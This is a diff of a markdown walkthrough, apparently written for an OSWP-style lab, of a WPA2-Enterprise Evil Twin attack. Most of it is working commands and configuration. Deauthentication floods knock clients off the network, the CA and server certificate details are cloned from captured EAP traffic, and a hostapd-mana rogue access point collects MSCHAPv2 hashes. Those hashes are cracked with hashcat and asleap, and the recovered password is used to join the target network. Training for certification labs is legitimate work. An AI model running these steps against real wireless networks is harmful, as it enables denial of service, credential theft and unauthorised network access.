@@ -1,8 +1,9 @@
 
-# 🛡️ WPA2-Enterprise / Evil Twin Attack Flow 
+# 🛡️ WPA2-Enterprise
+## Time to perform this attack: 20 minutes
 
 ## 📍 Goal
-Simulate a WPA2-Enterprise Evil Twin attack in a SSH-only lab, using only CLI tools. The objective is to:
+> *Simulate a WPA2-Enterprise Evil Twin attack in a SSH-only lab, using only CLI tools. We are going to*
 - Capture the authentication handshake
 - Analyze EAP communications
 - Extract useful information (CA, server certs)
@@ -11,53 +12,154 @@ Simulate a WPA2-Enterprise Evil Twin attack in a SSH-only lab, using only CLI to
 
 ---
 
-## 1. 📡 Monitor Interface Setup plus Discover plus DEAUT. 
+## ⚙️ Monitor Interface Setup
 
-> 🎯 *To catch the handshake we DEAUTH the fucking client connected to the fucking AP*
 ```bash
 sudo airmon-ng check kill
 sudo airmon-ng start wlan0
-sudo airodump-ng wlan0mon --band abg
-sudo airodump-ng wlan0mon --band abg -c 44 -w wifi-corp
-sudo aireplay-ng -0 1 -a <MAC-AP> -c <MAC-CLIENT> wlan0mon
+```
+
+## 🎯 Discovering APs
+
+- All the APs on both frequencies:
+```bash
+sudo airodump-ng --band abg wlan0mon
+CTRL-C
+```
+- Now let´s focus on channel where we found MGT network 
+```bash
+channel=44
+sudo airodump-ng -c ${channel} wlan0mon
+CTRL-C
+```
+- Finally, let's dump the info for the selected BSSID and ESSID
+```bash
+mkdir MGT
+cd MGT
+channel=44
+dumpfile='dump-wpa-mgt'
+bssid='F0:9F:C2:71:22:1A'
+essid='wifi-corp'
+sudo airodump-ng -c ${channel}  -w ${dumpfile} --output-format pcap --essid ${essid} --bssid ${bssid} wlan0mon
+```
+
+## 💣 DEAUTH
+
+>  *To catch the handshake we DEAUTH the f#!%^g client connected to the f#!%^g AP*
+
+- Open a second terminal tab. Send a deauthentication frame to both clients (broadcast). 
+In that case any connected client will try to re-authenticate again during our capture
+
+```bash
+essid='wifi-corp'
+sudo aireplay-ng -0 1 -e ${essid} wlan0mon
+```
+Now, return to terminal 1 and check if a WPA handshake is captured.
+If you found it Press CTRL+C to stop airodump. 
+Also, stop monitoring on wlan0mon. It´s important.
+
+```bash
 sudo airmon-ng stop wlan0mon
 ```
 ---
 
-## 2. 🎯 Capturing and Analyze EAP handshake
+## 🔍 Analyze EAP handshake
 
-> 📦 *We use `tshark` to capture packets and save them to a PCAP file
+>  *We use `tshark` to check packets and extract certificates info! This is juicy!*
 
 ```bash
-tshark -r wifi-corp-01.cap -Y "ssl.handshake.certificate and eapol" -T fields -e "tls.handshake.certificate" |sed "s/://g" | xxd -ps -r | tee $(mktemp $tmpbase.cert.XXXX.der) | openssl x509 -inform der -text
+dumpfile='/tmp/dump-wpa-mgt'
+bssid='F0:9F:C2:71:22:1A'
+tshark -r ${dumpfile}-01.cap -Y "wlan.bssid == ${bssid} && eap && tls.handshake.certificate" -V | grep rdnSequence: -A 1 | head -n 5
 ```
 or if you have time and you want, go slow:
 
 ```bash
-tshark -i wlan0 -w enterprise.pcap -Y "eap || eapol"
-tshark -r enterprise.pcap -Y "eap" -T fields -e frame.number -e eap.code -e eap.type -e eap.identity
-tshark -r enterprise.pcap -Y "tls.handshake.certificate" -V | less
+tshark -i wlan0 -w ${dumpfile}-01.cap -Y "eap || eapol"
+tshark -r ${dumpfile}-01.cap -Y "eap" -T fields -e frame.number -e eap.code -e eap.type -e eap.identity
+tshark -r ${dumpfile}-01.cap -Y "tls.handshake.certificate" -V | less
 ```
+- Now, the info we need to collect are those concerning CA and SERVER certificates. 
+In particular, we want to check these entries: 
+
+```bash
+CA:
+
+emailAddress=ca@WiFiChallenge.com,
+
+commonName=WiFiChallenge CA,
+
+organizationUnitName=Certificate Authority,
+
+organizationName= WiFiChallenge,
+
+localityName=Madrid,
+
+stateOrProvinceName=Madrid,
+
+countryName=ES
+```
+
+```bash
+Server:
+
+emailAddress=server@WiFiChallenge.com,
+
+commonName=WiFiChallenge CA,
+
+organizationUnitName=Server,
+
+organizationName= WiFiChallenge,
+
+localityName= Madrid,
+
+countryName=ES
+```
+Why we need these info about AP public key information? Because we will use them to create our own certificates. 
+FreeRadius is the tool for this.
 ---
 
-## 5. 🧪 Change CA and server files with the info you gained
-> 🧬 *Extract the server's certificate from the PCAP, convert it, and analyze its contents.*
+## 🧪 Change CA and server files with the info you gained
+> *At the end of this step we will have two certificates modified with the info we gained from the handshake.*
 
-Then use:
+So, let's do these changes
 ```bash
-make destroycerts
+sudo vi /etc/freeradius/3.0/certs/ca.cnf
+sudo vi /etc/freeradius/3.0/certs/server.cnf
+```
+
+And recreate the certificates with the updated info. 
+```bash
+sudo su
+cd  /etc/freeradius/3.0/certs
+rm dh
+openssl dhparam -out dh -2 2048
 make
 ```
+
+**With this in mind we can use them to impersonate the legitimate AP.** 
+## Indeed we have the ROGUE AP. BOOM!
+
 ---
 
-## 6. 🏴‍☠️ Set up hostapd-mana (Evil Twin)
+## 6. 🏴‍☠️ Set up hostapd-mana
 
-> 🎣 *We use hostapd-mana to spawn a rogue AP that mimics the original WPA2-Enterprise network, using the previously extracted certs or fake ones signed with same CA.*
+> *We use hostapd-mana to spawn a rogue AP that mimics the original WPA2-Enterprise network, using the previously extracted certs or fake ones signed with same CA.*
 
-Minimal config example `mana.conf`:
+Let's create an **eap-user file** to use with hostapd-mana.
+```bash
+cat << EOF > /tmp/mana.eap_user
+* PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+EOF
 ```
+And now let's create the **hostapd-mana** config file (/tmp/network.config).
+```bash
+essid='wifi-corp'
+
+cat << EOF > /tmp/network.conf
 # SSID of the AP
-ssid=wifi-corp
+ssid=${essid}
 
 # Network interface to use and driver type
 # We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
@@ -78,22 +180,26 @@ eap_server=1
 eapol_key_index_workaround=0
 
 # EAP user file we created earlier
-eap_user_file=/etc/hostapd-mana/mana.eap_user
+eap_user_file=/tmp/mana.eap_user
 
 # Certificate paths created earlier
 ca_cert=/etc/freeradius/3.0/certs/ca.pem
 server_cert=/etc/freeradius/3.0/certs/server.pem
 private_key=/etc/freeradius/3.0/certs/server.key
+
 # The password is actually 'whatever'
 private_key_passwd=whatever
 dh_file=/etc/freeradius/3.0/certs/dh
 
 # Open authentication
 auth_algs=1
+
 # WPA/WPA2
-wpa=2
+wpa=3
+
 # WPA Enterprise
 wpa_key_mgmt=WPA-EAP
+
 # Allow CCMP and TKIP
 # Note: iOS warns when network has TKIP (or WEP)
 wpa_pairwise=CCMP TKIP
@@ -109,52 +215,91 @@ mana_eapsuccess=1
 
 # EAP TLS MitM
 mana_eaptls=1
-
+EOF
 ```
 
-Minimal config example `mana.eap_user`:
+### 🎣 Drop the rogue attacker access-point:
+
 ```bash
-*     PEAP,TTLS,TLS,FAST
-"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+sudo ifconfig wlan0 down 
+sudo ifconfig wlan0 up
+sudo hostapd-mana /tmp/network.conf
 ```
+If our rogue access point transmits at a higher power than the legitimate ones, we can simply wait for a victim device to connect on its own.
+Alternatively, we can actively force client devices to connect to our rogue access point by launching a denial-of-service attack. This involves continuously sending deauthentication frames to all legitimate access points. It's crucial to target every AP within the same Wi-Fi network (‘wifi-corp’) at the same time — this ensures our rogue AP is the only available option for victim devices.
 
-FINALLY:
+To do this kind of DEAUTH we use airplay-ng 
 ```bash
-sudo hostapd-mana mana.conf
+bssid='F0:9F:C2:71:22:1A'
+essid='wifi-corp'
+
+sudo aireplay-ng -0 0 -e ${essid} -a ${bssid}  wlan0
 ```
+and
+```bash
+bssid='F0:9F:C2:71:22:15'
+essid='wifi-corp'
 
-From here you should get the password 
+sudo aireplay-ng -0 0 -e ${essid} -a ${bssid}  wlan1
+```
+**NOTE: in this case I did it 2 times since I had 2 APs connected to wifi-corp**
 
+Now, if we come back to the first terminal, we can check if a victim station is connected.
+If so, you should get the password 
+
+For **hashcat******
+```bash
+MANA EAP EAP-MSCHAPV2 HASHCAT | juan.tr::::a20d33a6d69754cb550ce451d41ddb5c4d6794dab01e230a:95bf6ccfec26252d
+```
+or **asleep**
 ```bash
 asleap -C d4:b9:92:06:0e:57:9a:0d -R 59:b8:e1:db:c7:a8:8e:bc:f7:21:28:52:92:f0:21:2b:88:0f:df:c4:fb:ef:fe:6f -W /usr/share/john/password.lst
 ```
-
----
-
-## 7. 🤖 wpa_supplicant (Client Side)
-Sample config `client.conf`:
-
-```
-network={  
-  ssid="wifi-corp"  
-  scan_ssid=1  
-  key_mgmt=WPA-EAP  
-  identity="CONTOSO\juan.tr"  
-  password="PASSWORD"  
-  eap=PEAP  
-  phase1="peaplabel=0"  
-  phase2="auth=MSCHAPV2"  
-}
-```
-
-Run:
+or **John the Ripper**
 ```bash
-wpa_supplicant -i wlan0 -c wpa_supplicant.conf
-dhclient -v wlan0
+MANA EAP EAP-MSCHAPV2 JTR | juan.tr:$NETNTLM$95bf6ccfec26252d$a20d33a6d69754cb550ce451d41ddb5c4d6794dab01e230a:::::::
+```
+Let's try to crack it with hashcat
+```bash
+echo -n  juan.tr::::a20d33a6d69754cb550ce451d41ddb5c4d6794dab01e230a:95bf6ccfec26252d > /tmp/hashcat.txt
+wordlist='rockyou.txt'
+hashcat -a 0 -m 5500 /tmp/hashcat.txt ${wordlist} --force
+```
+With the password we want to connect to the target network!
+
+```bash
+wpa_key='bulldogs1234'
+id='CONTOSO\juan.tr'
+essid='wifi-corp'
+
+cat << EOF > /tmp/client.conf
+network={
+  ssid="${essid}"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  eap=PEAP
+  identity="${id}"
+  password="${wpa_key}"
+  phase1="peaplabel=0"
+  phase2="auth=MSCHAPV2"
+}
+EOF
 ```
 
-> 📶 *This simulates a client attempting to connect to our rogue AP. We monitor and capture credentials in `/tmp/hostapd.credout` or via stdout.*
+## 🤖 Use this file with supplicant
+```bash
+sudo wpa_supplicant -i wlan0 -c /tmp/client.conf
+```
+Instead, to get a valid IP, on another terminal drop:
+```bash
+sudo dhclient wlan0 -v
+```
 
+Let's enjoy the flag!
+```bash
+target=192.168.6.1
+curl http://${target}/proof.txt
+```
 ---
 
 ## ✅ Wrap-up
@@ -164,4 +309,4 @@ You’ve:
 - Replicated the network and tricked clients
 - Logged EAP credentials via hostapd-mana
 
-This flow is 100% CLI-compatible and tailored for OSWP-style environments without GUI.
+This flow is 100% CLI-compatible and tailored for OSWP-style environments.
